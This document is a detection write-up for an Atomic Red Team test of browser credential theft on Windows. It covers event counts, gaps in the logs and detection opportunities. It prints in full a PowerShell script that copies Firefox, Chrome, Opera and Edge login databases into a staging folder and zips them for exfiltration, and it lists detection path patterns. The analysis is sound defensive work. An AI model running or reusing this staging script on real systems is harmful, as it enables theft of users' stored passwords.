# T1555.003-10: Credentials from Web Browsers — Stage Popular Credential Files for Exfiltration

## Technique Context

T1555.003 covers credential theft from web browsers. This test implements a multi-browser credential staging approach — a common adversary technique that collects credential database files from all popular browsers in a single pass before staging them for exfiltration. Rather than attempting to decrypt credentials on the compromised host (which requires specific user context and DPAPI access), this technique copies the raw credential files to a staging directory and compresses them for later exfiltration.

The test targets four browser families:

- **Firefox**: `key4.db` (encryption keys) and `logins.json` (encrypted credentials) from `%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\`
- **Chrome**: `Login Data` and `Login Data For Account` from `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`
- **Opera**: `Login Data` from `%APPDATA%\Opera Software\Opera Stable\`
- **Edge (Chromium)**: `Login Data` from `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\`

After copying any found files to `%TEMP%\T1555.003\`, the script compresses the staging directory to `%TEMP%\T1555.003.zip`. The cleanup step removes both the staging directory and the archive. This is a credential staging technique — the files must still be decrypted offline using appropriate tools and the user's DPAPI key material.

This test ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 187 total events: 33 Sysmon events, 150 PowerShell operational events, and 4 Security events.

**Sysmon EID 1 (Process Create)** captures four process creation events, three of which are key attack steps. The main credential staging command is fully captured:

```
CommandLine: "powershell.exe" & {$exfil_folder = ""$env:temp\T1555.003""
if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}
$FirefoxCredsLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
if (test-path ""$FirefoxCredsLocation\key4.db"") {copy-item ""$FirefoxCredsLocation\key4.db"" -destination ""$exfil_folder\T1555.003Firefox_key4.db""} else {}
if (test-path ""$FirefoxCredsLocation\logins.json"") {copy-item ""$FirefoxCredsLocation\logins.json"" -destination ""$exfil_folder\T1555.003Firefox_logins.json""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -destination ""$exfil_folder\T1555.003Chrome_Login Data""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"" -destination ""$exfil_folder\T1555.003Chrome_Login Data For Account""} else {}
if (test-path ""$env:appdata\Opera Software\Opera Stable\Login Data"") {copy-item ""$env:appdata\Opera Software\Opera Stable\Login Data"" -destination ""$exfil_folder\T1555.003Opera_Login Data""} else {}
if (test-path ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"") {copy-item ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"" -destination ""$exfil_folder\T1555.003Edge_Login Data""} else {}
compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force}
```

This is the complete staging script, fully logged in Sysmon EID 1's `CommandLine` field. Every browser targeted, every file path checked, and the compression step are all visible in a single event.

The cleanup command is also captured:

```
CommandLine: "powershell.exe" & {Remove-Item -Path ""$env:temp\T1555.003.zip"" -force -erroraction silentlycontinue
Remove-Item -Path ""$env:temp\T1555.003\"" -force -recurse -erroraction silentlycontinue}
```

**Security EID 4688** captures the same command lines:

```
Process Command Line: "powershell.exe" & {$exfil_folder = ""$env:temp\T1555.003""
if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}
...
compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force}
```

**Sysmon EID 7 (Image Load)** accounts for 20 events. **EID 10 (Process Access)** captures 4 events. **EID 11 (File Create)** captures 3 events. **EID 17 (Pipe Create)** captures 2 events.

**PowerShell EID 4104** captures 106 script block events and **EID 4103** captures 44 module pipeline events — a notably higher EID 4103 count than other tests in this batch. The 44 EID 4103 events reflect the many PowerShell cmdlet invocations (multiple `test-path`, `copy-item`, `new-item`, and `compress-archive` calls) that are logged individually when module pipeline logging is enabled. This is the richest EID 4103 dataset in this batch.

The script block logs also capture the ART cleanup invocation:

```
try {
    Invoke-AtomicTest T1555.003 -TestNumbers 10 -Cleanup -Confirm:$false 2>&1 | Out-Null
} catch {}
```

## What This Dataset Does Not Contain

**No evidence of which files were actually copied.** The PowerShell `copy-item` commands execute only if `test-path` returns true — meaning only browser credential files that exist on the system are copied. The event logs do not record the return value of `test-path` or which `copy-item` calls executed. Without Sysmon EID 11 events specifically showing files being created in `%TEMP%\T1555.003\`, it is not possible to determine from these logs alone which browsers had credentials present on ACME-WS06.

**No Sysmon EID 11 events showing the staged files.** The 3 EID 11 events in the dataset likely capture PowerShell startup profile files rather than browser credential file copies.

**No Sysmon EID 11 for the archive file.** The `compress-archive` operation would create `%TEMP%\T1555.003.zip`, but this file creation is not in the sampled events.

**No network events.** This test stages files locally but does not exfiltrate them. There are no Sysmon EID 3 or EID 22 events. The staged archive would need a separate exfiltration step.

## Assessment

T1555.003-10 generates the most informative single Sysmon EID 1 event in this entire batch. The complete credential staging script — all four browser targets, all file paths, the compression command — is captured verbatim in the process creation command line. This is an inherent characteristic of PowerShell's command-line logging: when an attack runs as a PowerShell one-liner passed via the `-Command` parameter, the entire script is recorded.

Compared to the defended variant (43 Sysmon, 89 PowerShell, 12 Security), the undefended dataset shows fewer Sysmon events (33 vs 43) but comparable PowerShell activity (150 vs 89). The defended variant's higher Sysmon count likely reflects Defender process activity.

The 44 EID 4103 events are distinctive: the PowerShell module pipeline logs each individual cmdlet invocation, producing a near-complete audit trail of `test-path` checks and `copy-item` operations as they execute. In environments where EID 4103 module logging is enabled at verbose levels, these events would provide explicit confirmation of which file operations occurred.

This technique is notable because it does not require any external tools, makes no network connections, uses only built-in PowerShell cmdlets, and can run in under a second. The entire operation completes so quickly that real-time detection must be near-instantaneous.

## Detection Opportunities Present in This Data

**Sysmon EID 1** is the highest-fidelity detection source: the complete staging script is captured in the `CommandLine` field. Specific file paths like `Google\Chrome\User Data\Default\Login Data`, `Mozilla\Firefox\Profiles`, `Opera Software\Opera Stable\Login Data`, and `Microsoft\Edge\User Data\Default\Login Data` combined with `copy-item` and `compress-archive` are extremely distinctive pattern strings. Any one of these browser credential paths appearing in a PowerShell command line should trigger investigation.

**Security EID 4688** captures the identical full command line for environments using Security event auditing instead of Sysmon.

**PowerShell EID 4103 (44 events)** records each individual cmdlet invocation including `test-path`, `copy-item`, `new-item`, and `compress-archive`. The `copy-item` events targeting browser profile directories are directly observable in module pipeline logs.

**PowerShell EID 4104** would capture the complete staging script as a script block if the script was loaded differently (e.g., from a file), but since it is passed inline, EID 1 captures the full command line.

The temporary directory name `$env:temp\T1555.003` and the archive `$env:temp\T1555.003.zip` are ART-specific artifacts. A real attacker would use different staging path names, but the file copy operations targeting browser profile directories would remain distinctive regardless of staging path.
